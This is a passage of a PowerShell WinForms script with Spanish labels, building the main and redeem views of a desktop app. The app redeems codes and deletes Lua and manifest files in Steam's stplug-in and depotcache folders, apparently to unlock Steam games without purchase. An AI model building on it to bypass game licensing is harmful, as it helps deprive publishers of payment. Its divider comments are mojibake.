# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  MAIN VIEW
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
$script:mp=New-Object BufferedPanel
$script:mp.Location=New-Object System.Drawing.Point(0,$CY)
$script:mp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:mp.BackColor=$BG

# Row 1: Activar +300 | Idioma
$script:c1=New-Card -X $PAD -Y $R1Y -W $HW -H $CH -Title (T "activar") -Sub (T "activarSub") -Icon "lightning" -Click {Switch-ToRedeem}
$script:mp.Controls.Add($script:c1)
$script:c3=New-Card -X ($PAD+$HW+$GAP) -Y $R1Y -W $HW -H $CH -Title (T "idioma") -Sub (T "idiomaSub") -Icon "globe" -Click {Show-LangDialog}
$script:mp.Controls.Add($script:c3)

# Row 2: Desinstalar (half, alone is ugly, pair with... let's keep original layout)
# Actually: Idioma | Desinstalar like original
# Move idioma back to row2
$script:mp.Controls.Remove($script:c3)
$script:c3=New-Card -X $PAD -Y $R2Y -W $HW -H $CH -Title (T "idioma") -Sub (T "idiomaSub") -Icon "globe" -Click {Show-LangDialog}
$script:mp.Controls.Add($script:c3)
$script:c4=New-Card -X ($PAD+$HW+$GAP) -Y $R2Y -W $HW -H $CH -Title (T "desinstalar") -Sub (T "desinstalarSub") -Icon "trash" -Click {
    $timers = Get-ActiveTimers
    if ($timers.Count -eq 0) { [System.Windows.Forms.MessageBox]::Show("No hay codigos activos para desinstalar.",(T "desinstalar"),"OK","Information"); return }
    # Double confirmation
    if ([System.Windows.Forms.MessageBox]::Show("ESTA ACCION ES PERMANENTE`n`nEste boton eliminara TODOS los juegos activos de forma PERMANENTE.`n`nESTAS SEGURO? SE BORRARAN TODOS LOS JUEGOS.",(T "desinstalar"),"YesNo","Warning") -ne "Yes") { return }
    if ([System.Windows.Forms.MessageBox]::Show("ULTIMA CONFIRMACION`n`nSe eliminaran todos los juegos activos. Esta accion no se puede deshacer.`n`nContinuar?",(T "desinstalar"),"YesNo","Warning") -ne "Yes") { return }
    $errors=0
    foreach ($t in $timers) {
        try { $root=$t.steam_root; foreach ($f in $t.lua_files) { Remove-FileHard (Join-Path (Join-Path $root "config\stplug-in") $f); Remove-FileHard (Join-Path (Join-Path $root "config\lua") $f) }; foreach ($f in $t.manifest_files) { Remove-FileHard (Join-Path (Join-Path $root "config\depotcache") $f) } } catch { $errors++ }
    }
    Save-Timers @(); $script:activeCodes.Clear(); Refresh-Codes
    [System.Windows.Forms.MessageBox]::Show("Juegos eliminados correctamente.","Listo","OK","Information")
}
$script:mp.Controls.Add($script:c4)

# Make Activar +300 full width in row1
$script:mp.Controls.Remove($script:c1)
$script:c1=New-Card -X $PAD -Y $R1Y -W $CW -H $CH -Title (T "activar") -Sub (T "activarSub") -Icon "lightning" -Click {Switch-ToRedeem}
$script:mp.Controls.Add($script:c1)

# Pagina Web
$script:cWeb=New-Card -X $PAD -Y $WEB_Y -W $CW -H $FCH -Title (T "web") -Sub (T "webSub") -Icon "webpage" -Click {Start-Process "https://github.com/bastisayes/Fixes-steam"}
$script:mp.Controls.Add($script:cWeb)

# Configuracion (tiny button in header, half-hidden)

# Discord (full width)
$script:c5=New-Card -X $PAD -Y $DISC_Y -W $CW -H $FCH -Title (T "discord") -Sub (T "discordSub") -Icon "discord" -Click {Start-Process "https://discord.gg/"}
$script:mp.Controls.Add($script:c5)

# TikTok (full width)
$script:c6=New-Card -X $PAD -Y $TIK_Y -W $CW -H $FCH -Title (T "tiktok") -Sub (T "tiktokSub") -Icon "tiktok" -Click {Start-Process "https://tiktok.com/"}
$script:mp.Controls.Add($script:c6)

# Salir
$script:salBtn=New-Object BufferedPanel
$script:salBtn.Location=New-Object System.Drawing.Point($PAD,$SAL_Y)
$script:salBtn.Size=New-Object System.Drawing.Size($CW,$SAL_H);$script:salBtn.BackColor=$BG
$script:salBtn.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:salBtn.Tag=@{Hover=$false}
$script:salBtn.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:salBtn.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:salBtn.Add_Click({ $form.Hide(); $script:trayIcon.Visible = $true })
$script:salBtn.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) $CR
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    $ep=New-Object System.Drawing.Pen($script:Cyan,1.8);$ecx=($s.Width/2)-22;$ecy=$s.Height/2
    $g.DrawLine($ep,($ecx-6),($ecy-8),($ecx-6),($ecy+8))
    $g.DrawLine($ep,($ecx-6),($ecy-8),$ecx,($ecy-8))
    $g.DrawLine($ep,($ecx-6),($ecy+8),$ecx,($ecy+8))
    $g.DrawLine($ep,($ecx+2),$ecy,($ecx+12),$ecy)
    $g.DrawLine($ep,($ecx+8),($ecy-4),($ecx+12),$ecy)
    $g.DrawLine($ep,($ecx+8),($ecy+4),($ecx+12),$ecy);$ep.Dispose()
    $tb=New-Object System.Drawing.SolidBrush($script:White);$txt=T "salir"
    $ss=$g.MeasureString($txt,$script:FntSalir)
    $g.DrawString($txt,$script:FntSalir,$tb,($s.Width/2)-($ss.Width/2)+8,($s.Height-$ss.Height)/2);$tb.Dispose()
})
$script:mp.Controls.Add($script:salBtn)
$form.Controls.Add($script:mp)

# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
#  REDEEM VIEW
# ÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚ÂÃƒÂ¢Ã¢â‚¬Â¢Ã‚Â
$script:rp=New-Object BufferedPanel
$script:rp.Location=New-Object System.Drawing.Point(0,$CY)
$script:rp.Size=New-Object System.Drawing.Size($FW,($FH-$CY));$script:rp.BackColor=$BG;$script:rp.Visible=$false

# Back arrow + title on same line
$script:backB=New-Object BufferedPanel
$script:backB.Location=New-Object System.Drawing.Point($PAD,8)
$script:backB.Size=New-Object System.Drawing.Size(36,36);$script:backB.BackColor=$BG
$script:backB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:backB.Tag=@{Hover=$false}
$script:backB.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:backB.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:backB.Add_Click({Switch-ToMain})
$script:backB.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:CardHover}else{$script:CardBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 8
    $b1=New-Object System.Drawing.SolidBrush($bc);$b2=New-Object System.Drawing.Pen($script:CardBorder,1)
    $g.FillPath($b1,$p);$g.DrawPath($b2,$p);$b1.Dispose();$b2.Dispose();$p.Dispose()
    # Draw arrow <
    $ap=New-Object System.Drawing.Pen($script:Cyan,2.5)
    $cx2=$s.Width/2;$cy2=$s.Height/2
    $g.DrawLine($ap,($cx2+4),($cy2-7),($cx2-4),$cy2)
    $g.DrawLine($ap,($cx2-4),$cy2,($cx2+4),($cy2+7));$ap.Dispose()
})
$script:rp.Controls.Add($script:backB)

# Title next to back button
$script:rTit=New-Object System.Windows.Forms.Label
$script:rTit.Text=T "canjear"
$script:rTit.Font=$script:FntRedeemTitle
$script:rTit.ForeColor=$White;$script:rTit.BackColor=$BG;$script:rTit.AutoSize=$true
$script:rTit.Location=New-Object System.Drawing.Point(([int]$PAD+42),14)
$script:rp.Controls.Add($script:rTit)

$script:rSubL=New-Object System.Windows.Forms.Label
$script:rSubL.Text=T "canjearSub"
$script:rSubL.Font=$FntSub;$script:rSubL.ForeColor=$Gray;$script:rSubL.BackColor=$BG;$script:rSubL.AutoSize=$true
$script:rSubL.Location=New-Object System.Drawing.Point($PAD,52)
$script:rp.Controls.Add($script:rSubL)

# Input + paste + submit
$txtC=New-Object System.Windows.Forms.TextBox
$txtC.Location=New-Object System.Drawing.Point($PAD,76)
$txtC.Size=New-Object System.Drawing.Size(([int]$CW-160),26)
$txtC.Font=New-Object System.Drawing.Font("Consolas",11)
$txtC.BackColor=$InputBG;$txtC.ForeColor=$White;$txtC.BorderStyle="FixedSingle";$txtC.MaxLength=50
$script:rp.Controls.Add($txtC)

# Paste button (pega del portapapeles)
$script:pasteB=New-Object BufferedPanel
$script:pasteB.Location=New-Object System.Drawing.Point(([int]$PAD+[int]$CW-154),74)
$script:pasteB.Size=New-Object System.Drawing.Size(50,28);$script:pasteB.BackColor=$BG
$script:pasteB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:pasteB.Tag=@{Hover=$false}
$script:pasteB.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:pasteB.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
$script:pasteB.Add_Paint({param($s,$e)
    $g=$e.Graphics;$g.SmoothingMode='AntiAlias';$g.TextRenderingHint='ClearTypeGridFit'
    $bc=if($s.Tag.Hover){$script:PegarBtnBGH}else{$script:PegarBtnBG}
    $p=New-RR 0 0 ($s.Width-1) ($s.Height-1) 7
    $b1=New-Object System.Drawing.SolidBrush($bc);$bp=New-Object System.Drawing.Pen($script:Cyan,1)
    $g.FillPath($b1,$p);$g.DrawPath($bp,$p);$b1.Dispose();$bp.Dispose();$p.Dispose()
    $sz=$g.MeasureString((T "pegarBtn"),$script:FntSubmit)
    $tb=New-Object System.Drawing.SolidBrush($script:Cyan)
    $g.DrawString((T "pegarBtn"),$script:FntSubmit,$tb,($s.Width-$sz.Width)/2,($s.Height-$sz.Height)/2);$tb.Dispose()
})
$script:pasteB.Add_Click({
    try {
        $clip = [System.Windows.Forms.Clipboard]::GetText()
        if ($clip) { $txtC.Text = $clip.Trim(); $txtC.Focus(); $txtC.Select($txtC.Text.Length,0) }
    } catch { [System.Windows.Forms.MessageBox]::Show("No se pudo acceder al portapapeles.","Error","OK","Warning") | Out-Null }
})
$script:rp.Controls.Add($script:pasteB)

$script:subB=New-Object BufferedPanel
$script:subB.Location=New-Object System.Drawing.Point(([int]$PAD+[int]$CW-98),74)
$script:subB.Size=New-Object System.Drawing.Size(98,28);$script:subB.BackColor=$BG
$script:subB.Cursor=[System.Windows.Forms.Cursors]::Hand;$script:subB.Tag=@{Hover=$false}
$script:subB.Add_MouseEnter({param($s);$s.Tag.Hover=$true;$s.Invalidate()})
$script:subB.Add_MouseLeave({param($s);$s.Tag.Hover=$false;$s.Invalidate()})
